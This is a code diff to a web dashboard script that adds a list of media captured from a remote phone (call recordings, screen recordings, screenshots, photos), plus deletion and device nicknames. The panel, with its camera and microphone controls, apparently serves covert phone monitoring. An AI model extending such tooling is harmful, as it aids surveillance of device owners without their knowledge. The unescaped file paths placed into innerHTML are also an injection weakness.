@@ -6,6 +6,8 @@ let deviceKey = "";
     document.getElementById("deviceTitle").textContent = "DEVICE: " + deviceKey;
     await loadStatus();
     loadCameras();
+    loadMedia();
+    loadNickname();
 })();
 
 function getHostPort() {
@@ -30,7 +32,17 @@ async function loadStatus() {
     const { host, port } = getHostPort();
     const data = await api(`/api/device/${host}/${port}/health`);
     if (!data) return;
-    setVal("#statusOnline .value", data.status === "ok" ? "ONLINE" : "OFFLINE");
+    const online = data.status === "ok";
+    const val = document.getElementById("statusOnlineValue");
+    const icon = document.getElementById("statusOnlineIcon");
+    if (val) {
+        val.textContent = online ? "ONLINE" : "OFFLINE";
+        // Offline devices render in black (per spec) — green only when live.
+        val.className = "font-headline text-2xl font-bold value " + (online ? "text-maquis-green" : "text-black");
+    }
+    if (icon) {
+        icon.className = "material-symbols-outlined " + (online ? "text-maquis-green animate-pulse" : "text-black");
+    }
     setVal("#statusUptime .value",
         data.uptimeSeconds ? fmtUptime(data.uptimeSeconds) : "—");
     setVal("#statusNetwork .value", `${host}:${port}`);
@@ -145,4 +157,87 @@ async function toggleMic() {
 async function refreshDevice() {
     await loadStatus();
     await loadDeviceInfo();
+    await loadMedia();
+}
+
+// ---------------------------------------------------------------------------
+// Captured media (call recordings, videos, screen recordings, screenshots)
+// + device nickname — all served from the local encrypted DB, phone offline OK
+// ---------------------------------------------------------------------------
+
+const MEDIA_META = {
+    call_recording:  { icon: "call",              label: "CALL RECORDING" },
+    video:           { icon: "movie",             label: "VIDEO" },
+    screen_recording:{ icon: "smart_display",     label: "SCREEN RECORDING" },
+    screenshot:      { icon: "screenshot_monitor",label: "SCREENSHOT" },
+    photo:           { icon: "photo_camera",      label: "PHOTO" },
+};
+
+function fmtSize(b) {
+    if (!b) return "";
+    if (b < 1024) return `${b} B`;
+    if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`;
+    return `${(b / 1048576).toFixed(1)} MB`;
+}
+
+function fmtDur(s) {
+    if (!s) return "";
+    const m = Math.floor(s / 60), sec = Math.floor(s % 60);
+    return `${m}m ${sec.toString().padStart(2, "0")}s`;
+}
+
+async function loadMedia() {
+    const { host, port } = getHostPort();
+    const list = document.getElementById("mediaList");
+    const data = await api(`/api/device/${host}/${port}/media`);
+    if (!data) return;
+    const items = data.media || [];
+    if (!items.length) {
+        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
+            <span class="material-symbols-outlined text-sm text-moon-silver/60">collections</span>
+            <span class="font-label text-sm text-on-surface/60">NO_CAPTURES</span></div>`;
+        return;
+    }
+    list.innerHTML = items.map(m => {
+        const meta = MEDIA_META[m.kind] || { icon: "folder", label: m.kind };
+        const metaLine = [fmtSize(m.size_bytes), fmtDur(m.duration_sec)].filter(Boolean).join(" · ");
+        return `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
+            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${meta.icon}</span>
+            <div class="flex-1 min-w-0">
+                <div class="font-label text-sm text-on-surface truncate">${meta.label}</div>
+                <div class="font-label text-[10px] text-moon-silver/50 truncate">${m.path || "—"}${metaLine ? " · " + metaLine : ""} · ${new Date((m.captured_at || Date.now()) * 1000).toLocaleString()}</div>
+            </div>
+            <button onclick="deleteMedia(${m.id})" title="Delete entry" class="text-moon-silver/40 hover:text-error transition-colors p-1">
+                <span class="material-symbols-outlined text-sm">delete</span>
+            </button>
+        </div>`;
+    }).join("");
+}
+
+async function deleteMedia(id) {
+    const { host, port } = getHostPort();
+    if (!confirm("Delete this media entry from the catalogue?")) return;
+    await api(`/api/device/${host}/${port}/media/${id}`, { method: "DELETE" });
+    loadMedia();
+}
+
+async function saveNickname() {
+    const { host, port } = getHostPort();
+    const input = document.getElementById("nicknameInput");
+    const nick = input.value.trim();
+    if (!nick) return;
+    await api(`/api/device/${host}/${port}/nickname`,
+        { method: "POST", body: JSON.stringify({ nickname: nick }) });
+    document.getElementById("deviceTitle").textContent = "DEVICE: " + nick;
+    input.blur();
+}
+
+async function loadNickname() {
+    const { host, port } = getHostPort();
+    const devs = await api("/api/devices");
+    if (!devs) return;
+    const dev = devs[`${host}:${port}`];
+    if (dev && dev.nickname) {
+        document.getElementById("nicknameInput").value = dev.nickname;
+    }
 }
